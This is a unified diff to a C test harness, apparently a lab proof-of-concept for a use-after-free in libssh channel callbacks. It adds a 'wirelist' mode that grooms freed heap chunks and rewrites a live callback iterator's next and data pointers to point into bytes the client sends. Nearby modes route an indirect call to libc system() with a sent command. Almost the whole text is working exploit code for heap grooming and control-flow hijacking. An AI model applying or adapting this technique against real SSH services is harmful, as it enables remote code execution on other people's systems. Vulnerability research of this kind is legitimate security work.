@@ -45,6 +45,14 @@ static struct ssh_iterator *g_old_it = NULL;
 #define INLINE_CBS_OFF 72
 static int g_inline = 0;
 #endif
+#ifdef W24_WIRELIST
+/* W24: refill the already-running callback iterator from the same wire
+ * packet that recycles the freed channel. No app-owned callbacks object or
+ * iterator values remain; the W13 inline callbacks struct is also wire bytes. */
+#define WIRELIST_IT_OFF 96
+static int g_wirelist = 0;
+static uint64_t g_wirelist_chunk = 0;
+#endif
 #ifdef W14_REALSYSTEM
 /* W14: the indirect call from channel_rcv_data() targets real libc system().
  * The callback's first argument is channel->session, read from the recycled
@@ -162,10 +170,28 @@ static int on_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
             int i;
             struct ssh_iterator *it = NULL;
             struct lab_buffer *bf = NULL;
+#ifdef W24_WIRELIST
+            /* ASan's allocator keeps more chunks in the size-class free list
+             * than the plain build; more attempts are needed to reach the two
+             * specific freed address slots. */
+            for (i = 0; i < 8192 && (it == NULL || bf == NULL); i++) {
+#else
             for (i = 0; i < 64 && (it == NULL || bf == NULL); i++) {
+#endif
+#ifdef W24_WIRELIST
+                if (it == NULL) {
+                    void *c = malloc(sizeof(struct ssh_iterator));
+                    if (c == g_old_it) it = c;
+                }
+                if (bf == NULL) {
+                    void *c = malloc(sizeof(struct lab_buffer));
+                    if (c == g_old_buf) bf = c;
+                }
+#else
                 void *c = malloc(sizeof(struct ssh_iterator));
                 if (c == g_old_it) it = c;
                 if (c == g_old_buf) bf = c;
+#endif
             }
             memset(&g_fake_cbs, 0, sizeof(g_fake_cbs));
             g_fake_cbs.size = sizeof(g_fake_cbs);
@@ -186,6 +212,21 @@ static int on_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
                 g_fake_it.data = (char *)g_groom_ptr + INLINE_CBS_OFF;
                 printf("SERVER inline cbs=%p off=%d\n", g_fake_it.data,
                        INLINE_CBS_OFF);
+                fflush(stdout);
+            }
+#endif
+#ifdef W24_WIRELIST
+            if (g_wirelist && it != NULL) {
+                /* The first loop step already read its callback struct before
+                 * on_data ran. Redirect its next step to the wire-resident
+                 * iterator at recycled-channel offset 96; that iterator's
+                 * next/data fields are bytes the authenticated client sent. */
+                it->next = (struct ssh_iterator *)
+                    ((char *)g_groom_ptr + WIRELIST_IT_OFF);
+                it->data = (const void *)
+                    ((char *)g_groom_ptr + INLINE_CBS_OFF);
+                printf("SERVER wirelist it=%p next=%p data=%p\n",
+                       (void *)it, (void *)it->next, it->data);
                 fflush(stdout);
             }
 #endif
@@ -476,6 +517,17 @@ static int run_client(void)
                 fflush(stdout);
             }
 #endif
+#ifdef W24_WIRELIST
+            if (g_wirelist) {
+                uint64_t cbs = g_wirelist_chunk + INLINE_CBS_OFF;
+                uint64_t nxt = 0;
+                memcpy(payload + WIRELIST_IT_OFF, &nxt, sizeof(nxt));
+                memcpy(payload + WIRELIST_IT_OFF + 8, &cbs, sizeof(cbs));
+                printf("CLIENT wirelist cbs=0x%llx next=0x%llx\n",
+                       (unsigned long long)cbs, (unsigned long long)nxt);
+                fflush(stdout);
+            }
+#endif
                 memcpy(payload, g_exec_cmd, sizeof(g_exec_cmd));
 #ifdef W12_FIXEDADDR
                 printf("CLIENT sent exec cmd=%s fn=0x%llx fixedaddr=%d\n",
@@ -526,13 +578,13 @@ int main(int argc, char **argv)
     __asan_set_death_callback(asan_death);
     ssh_init();
     pid_t pid;
-#if defined(W12_FIXEDADDR) || defined(W16_WIRECMD)
+#if defined(W12_FIXEDADDR) || defined(W16_WIRECMD) || defined(W24_WIRELIST)
     if (argc < 2 || argc > 4) {
 #else
     if (argc < 2 || argc > 3) {
 #endif
         fprintf(stderr,
-#if defined(W12_FIXEDADDR) || defined(W16_WIRECMD)
+#if defined(W12_FIXEDADDR) || defined(W16_WIRECMD) || defined(W24_WIRELIST)
                 "usage: %s hostkey [data-only|no-free|groom|groom-survive|groom-call|groom-call-bad|groom-exec|groom-nodetach-exec|groom-nodetach-bare|groom-fixedaddr|client-only FN_ADDR|server-only|server-fixedaddr FN_ADDR]\n",
 #elif !defined(W14_REALSYSTEM)
                 "usage: %s hostkey [data-only|no-free|groom|groom-survive|groom-call|groom-call-bad|groom-exec|groom-nodetach-exec|groom-nodetach-bare]\n",
@@ -540,6 +592,9 @@ int main(int argc, char **argv)
                 "usage: %s hostkey [data-only|no-free|groom|groom-survive|groom-call|groom-call-bad|groom-exec|groom-nodetach-exec|groom-nodetach-bare|groom-realsystem|groom-realsystem-bad]\n",
 #endif
                 argv[0]);
+#ifdef W24_WIRELIST
+        fprintf(stderr, "W24 modes: %s hostkey groom-wirelist CHUNK_ADDR|groom-wirelist-bad CHUNK_ADDR\n", argv[0]);
+#endif
         return 2;
     }
 #ifdef W12_FIXEDADDR
@@ -573,6 +628,11 @@ int main(int argc, char **argv)
      * the build path and harness text. */
     if (argc >= 4 && strncmp(argv[3], "0x", 2) == 0) {
         g_wirecmd_chunk = strtoull(argv[3], NULL, 16);
+    }
+#endif
+#ifdef W24_WIRELIST
+    if (argc >= 4 && strncmp(argv[3], "0x", 2) == 0) {
+        g_wirelist_chunk = strtoull(argv[3], NULL, 16);
     }
 #endif
     if (argc == 3 && strcmp(argv[2], "data-only") == 0) {
@@ -651,6 +711,23 @@ int main(int argc, char **argv)
         g_nodetach = 1;
         g_exec = 1;
         g_inline = 1;
+        g_bad_call = 1;
+#endif
+#ifdef W24_WIRELIST
+    } else if (argc == 4 && strcmp(argv[2], "groom-wirelist") == 0) {
+        g_groom = 1;
+        g_call = 1;
+        g_nodetach = 1;
+        g_exec = 1;
+        g_inline = 1;
+        g_wirelist = 1;
+    } else if (argc == 4 && strcmp(argv[2], "groom-wirelist-bad") == 0) {
+        g_groom = 1;
+        g_call = 1;
+        g_nodetach = 1;
+        g_exec = 1;
+        g_inline = 1;
+        g_wirelist = 1;
         g_bad_call = 1;
 #endif
 #ifdef W12_FIXEDADDR
